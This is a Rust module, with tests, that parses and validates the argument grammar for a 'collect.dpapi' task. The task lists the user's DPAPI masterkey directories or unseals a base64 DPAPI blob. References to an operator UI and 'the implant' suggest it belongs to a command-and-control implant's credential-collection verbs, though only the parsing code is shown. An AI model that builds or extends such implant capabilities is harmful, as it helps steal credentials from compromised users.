//! The task-argument grammar: `collect.dpapi [action] <blob>`. The
//! operator UI serializes a task form by joining parameter values with
//! single spaces in declaration order, so the positional reading is
//! the canonical wire shape; the `key=` assignments are the hand-typed
//! alternative, and the blob is the raw remainder either way -- base64
//! carries no spaces, but the remainder keeps the grammar one rule
//! shorter. The blob is validated as base64 here, so a malformed task
//! refuses before anything touches the protection API.
//!
//! The slots refuse what they do not know rather than half-reading
//! under a typo (the same rule the runkeys grammar holds), and the
//! per-action validation teaches the shape each action needs.

/// What the task asked the verb to do.
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum Action {
    /// Report the readiness fact: the masterkey directory of the user
    /// the implant runs as, with the SID directories it carries. The
    /// default: a bare `collect.dpapi` is a read, never a write.
    List,
    /// Unseal the task's blob under the running user's masterkeys.
    Unseal,
}

/// A parsed task argument string.
#[derive(Debug, PartialEq, Eq)]
pub(crate) struct Arguments {
    pub action: Action,
    /// The base64 DPAPI blob; unseal only, the raw remainder of the
    /// grammar.
    pub blob: Option<String>,
}

/// Parses the argument grammar.
pub(crate) fn parse(arguments: &str) -> Result<Arguments, String> {
    let text = arguments.trim();
    let (action_token, rest) = split_first_token(text);
    let action = action_of(action_token)?;
    let rest = rest.trim_start();

    // The blob: `blob=` then everything after, or the positional
    // remainder verbatim.
    let blob = if rest.is_empty() {
        None
    } else if let Some(value) = rest.strip_prefix("blob=") {
        (!value.trim().is_empty()).then(|| value.trim().to_string())
    } else {
        Some(rest.trim().to_string())
    };

    Ok(Arguments { action, blob })
}

/// Checks the parsed grammar against the action it names: unseal
/// needs its blob and the blob must be base64 the codec answers; list
/// is a read that carries none.
pub(crate) fn validate(arguments: &Arguments) -> Result<(), String> {
    let grammar = "the grammar is: dpapi <unseal|list> <blob>";
    match arguments {
        Arguments {
            action: Action::List,
            blob: Some(_),
        } => Err(format!(
            "blob rides unseal only; list is the read; {grammar}"
        )),
        Arguments {
            action: Action::List,
            blob: None,
        } => Ok(()),
        Arguments {
            action: Action::Unseal,
            blob: None,
        } => Err(format!(
            "unseal needs the base64 blob as the trailing remainder; {grammar}"
        )),
        Arguments {
            action: Action::Unseal,
            blob: Some(blob),
        } => crate::base64::decode(blob)
            .map(|_| ())
            .map_err(|flaw| format!("collect.dpapi: {flaw}")),
    }
}

/// The action half of the grammar: a bare token or `action=<token>`,
/// case-insensitive.
fn action_of(token: &str) -> Result<Action, String> {
    let action = token.strip_prefix("action=").unwrap_or(token);
    match action.to_ascii_lowercase().as_str() {
        "" | "list" => Ok(Action::List),
        "unseal" => Ok(Action::Unseal),
        // The refusal quotes the token as the operator typed it; the
        // case-fold was this parser's own doing.
        _ => Err(format!(
            "collect.dpapi: unknown action '{action}' (unseal, list)"
        )),
    }
}

fn split_first_token(text: &str) -> (&str, &str) {
    match text.split_once(char::is_whitespace) {
        Some((first, rest)) => (first, rest),
        None => (text, ""),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_positional_form_is_the_wire_shape() {
        assert_eq!(
            parse("unseal AQIDAP8=").unwrap(),
            Arguments {
                action: Action::Unseal,
                blob: Some("AQIDAP8=".into()),
            }
        );
        assert_eq!(
            parse("list").unwrap(),
            Arguments {
                action: Action::List,
                blob: None,
            }
        );
    }

    #[test]
    fn the_keyed_form_teaches_the_same_read() {
        assert_eq!(
            parse("action=unseal blob=AQID").unwrap(),
            Arguments {
                action: Action::Unseal,
                blob: Some("AQID".into()),
            }
        );
        assert_eq!(
            parse("").unwrap(),
            Arguments {
                action: Action::List,
                blob: None,
            }
        );
    }

    #[test]
    fn tokens_read_bare_assigned_and_cased() {
        assert_eq!(parse("").unwrap().action, Action::List);
        assert_eq!(parse("UNSEAL").unwrap().action, Action::Unseal);
        assert_eq!(parse("action=List").unwrap().action, Action::List);
    }

    #[test]
    fn unknown_tokens_refuse_naming_the_choices() {
        // A typo refuses the task rather than half-reading under it.
        let action = parse("decrypt AQID").unwrap_err();
        assert!(action.contains("unknown action 'decrypt'"), "{action}");
        assert!(action.contains("unseal, list"), "{action}");
    }

    #[test]
    fn each_action_gets_the_parts_it_needs() {
        // Unseal: the blob, and it must be base64.
        assert!(validate(&parse("unseal AQIDAP8=").unwrap()).is_ok());
        assert!(validate(&parse("unseal").unwrap()).is_err());
        let malformed = validate(&parse("unseal not base64!").unwrap()).unwrap_err();
        assert!(malformed.contains("not valid base64"), "{malformed}");

        // List: a read, never a blob.
        assert!(validate(&parse("list").unwrap()).is_ok());
        assert!(validate(&parse("").unwrap()).is_ok());
        assert!(validate(&parse("list AQID").unwrap()).is_err());
    }
}
